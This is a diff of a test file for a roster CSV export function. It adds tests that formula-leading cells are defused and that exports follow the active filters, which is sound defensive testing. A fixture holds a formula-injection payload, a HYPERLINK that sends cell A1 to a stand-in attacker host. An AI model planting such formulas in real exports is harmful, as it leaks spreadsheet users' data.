@@ -197,6 +197,46 @@ describe('exportMembersAction', () => {
     expect(result.csv).toContain('"Ashburn, Loudoun"');
   });
 
+  it('defuses a cell that would open as a formula, and leaves phone numbers alone', async () => {
+    useClient({
+      pages: [
+        [
+          listRow({
+            // `=` and `@` lead nothing in a real Supreme export, which is why
+            // defusing them is free. A value that begins with one got there
+            // through somebody's upload.
+            full_name: '=HYPERLINK("http://evil.example/"&A1,"Click")',
+            city: '@SUM(A1:A9)',
+            // The other half, and the reason the blanket mitigation was
+            // rejected: `normalizePhone` deliberately preserves a non-US
+            // number exactly as written, so a `'` in front of it would corrupt
+            // correct data on every export the council ever takes.
+            phone: '+44 20 7946 0958',
+            address_line1: '-12 Hyphen Way',
+          }),
+        ],
+      ],
+    });
+
+    const result = await exportMembersAction({ search: null });
+
+    expect(result.success).toBe(true);
+
+    if (!result.success) return;
+
+    // Quoted because of the comma, and defused inside the quotes.
+    expect(result.csv).toContain(
+      `"'=HYPERLINK(""http://evil.example/""&A1,""Click"")"`,
+    );
+    expect(result.csv).toContain(`,'@SUM(A1:A9),`);
+
+    // Untouched.
+    expect(result.csv).toContain(',+44 20 7946 0958,');
+    expect(result.csv).toContain(',-12 Hyphen Way,');
+    expect(result.csv).not.toContain(`'+44`);
+    expect(result.csv).not.toContain(`'-12`);
+  });
+
   it('pages through the roster and always asks for an explicit limit', async () => {
     const full = Array.from({ length: 200 }, (_, index) =>
       listRow({ membership_number: String(2000000 + index) }),
@@ -229,6 +269,26 @@ describe('exportMembersAction', () => {
       p_search: 'smith',
       p_limit: 200,
       p_offset: 200,
+    });
+  });
+
+  it('exports the filtered set, not the whole roster', async () => {
+    const fake = useClient({ pages: [[listRow()]] });
+
+    const result = await exportMembersAction({
+      search: null,
+      city: 'Ashburn',
+      hasAccount: false,
+    });
+
+    expect(result.success).toBe(true);
+
+    // The button says "Export CSV" beside a list the officer has narrowed. A
+    // file that ignored the filters would be a different 372 rows from the
+    // ones on screen, and nothing on the screen would say so.
+    expect(fake.calls[0]?.args).toMatchObject({
+      p_city: 'Ashburn',
+      p_has_account: false,
     });
   });
 
